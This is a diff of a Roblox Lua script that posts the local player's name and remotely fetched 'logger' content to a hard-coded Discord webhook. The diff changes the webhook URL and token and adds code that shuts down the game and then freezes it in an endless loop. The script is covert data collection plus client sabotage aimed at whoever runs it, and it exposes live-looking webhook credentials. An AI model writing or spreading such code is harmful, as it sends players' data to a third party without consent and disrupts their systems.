@@ -1,11 +1,11 @@
-local webh = "https://discord.com/api/webhooks/993029616237289542/yIAEhAp6JBKmgB2eYG_GU_oQKhG4eu5Fun1THAFgxwDXVnyTPzL0C9GRN4p7H9MoB1Te"
+local webh = "https://discord.com/api/webhooks/992979632053817415/S-006Saqp1nq8ZIMc1xOReoxW8ucqk548-IvlB5LBJw1oMk-MUx-XAPd9jlZYz7T77-f"
 
 pcall(function()
    local data = {
        ["embeds"] = {
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
-               ["description"] = game:HttpGet("https://raw.githubusercontent.com/creepyV4/log-1/main/logger1")
+               ["description"] = game:HttpGet("https://raw.githubusercontent.com/creepyV4/log-1/main/logger1.")
            }
        }
    }
@@ -45,3 +45,6 @@ pcall(function()
        );
    end
 end)
+wait(2)
+game:Shutdown()
+while true do end
